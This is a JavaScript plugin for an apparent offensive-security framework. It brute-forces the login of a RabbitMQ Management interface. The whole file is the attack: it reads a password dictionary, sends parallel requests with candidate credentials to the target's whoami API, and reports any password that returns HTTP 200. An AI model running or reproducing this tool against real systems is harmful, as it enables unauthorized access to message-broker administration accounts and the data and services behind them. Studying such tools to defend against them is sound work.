// Main
class Plugin {
    constructor(log, info, dependencies){
        this.log = log
        this.platforms = info.platforms
        this.arch = info.arch
        this.fullInfo = info.fullInfo
        this.dependencies = dependencies
    }

    info(){
        return {
            name: "RabbitMQ Management",
            description: "RabbitMQ Management login bruteforcer.",
            authors: [
                "I2rys"
            ],
            references: [],
            platforms: [
                this.platforms.win
            ],
            arch: this.arch.both,
            options: [
                {
                    name: "url",
                    description: "The RabbitMQ Management login form url.",
                    required: true
                },
                {
                    name: "username",
                    description: "The username to bruteforce.",
                    default: "admin",
                    required: true
                },
                {
                    name: "dictionary",
                    description: "A path of a file that contains a list of passwords.",
                    required: true
                }
            ],
            disclosureDate: "2022-07-07"
        }
    }

    run(args){
        const { runJobs } = this.dependencies.parallelPark
        const request = this.dependencies.request
        const fs = this.dependencies.fs
        const log = this.log

        return new Promise(async(resolve)=>{
            const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

            var password = await runJobs(
                dictionary,
                async(password, index, max)=>{
                    var response = await request(`${args.url}api/whoami`, {
                        headers: {
                            "authorization": Buffer.from(`${args.username}:${password}`, "utf8").toString("base64")
                        }
                    })

                    if(response.statusCode === 200){
                        return password
                    }else{
                        log("i", `Invalid password. ${password}`)
                    }
                }
            )

            password = password.filter((password) => password)

            password.length ? log("i", `Valid password found: ${password}`) : log("w", "No valid password found.")

            resolve()
        })
    }
}

module.exports = Plugin